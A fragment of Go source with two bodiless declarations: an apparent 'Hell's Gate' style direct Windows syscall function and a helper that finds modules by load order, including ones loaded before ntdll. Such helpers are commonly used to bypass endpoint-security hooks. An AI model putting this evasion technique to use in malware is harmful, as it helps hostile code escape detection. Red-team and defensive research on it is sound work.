func hgSyscall(callid uint16, argh ...uintptr) (errcode uint32)

//getModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func getMLO(i int) (start uintptr, size uintptr, modulepath *sstring)
